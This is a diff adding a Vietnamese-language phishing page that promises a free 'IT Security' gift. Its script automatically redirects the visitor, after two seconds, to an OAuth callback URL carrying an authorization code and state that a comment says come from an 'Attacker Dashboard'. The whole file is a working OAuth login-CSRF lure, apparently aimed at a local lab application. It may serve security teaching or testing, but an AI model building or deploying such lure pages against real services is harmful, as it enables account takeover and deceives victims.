@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Quà tặng miễn phí!</title>
+</head>
+<body>
+    <h1>Chúc mừng! Bạn nhận được một phần quà IT Security</h1>
+    <p>Đang tải nội dung, vui lòng chờ trong giây lát...</p>
+
+    <script>
+        // Dán URL Bẫy bạn lấy từ Attacker Dashboard vào đây
+        const attackerCallbackUrl = "https://localhost:5000/auth/callback?code=4/0Aci98E-yh3jLle5PKt7ihUfJz7M05PiDxJXkMaN3qy1mwnymQOj3PxD5OfWH26uJ09fhNQ&state=uVzXQ3Ocj5juMpVQqWwfuqZtkdYI1sZLkXs0ao_owu8";
+
+        // Tự động chuyển hướng nạn nhân sau 2 giây (2000ms)
+        setTimeout(() => {
+            window.location.href = attackerCallbackUrl;
+        }, 2000);
+    </script>
+</body>
+</html>
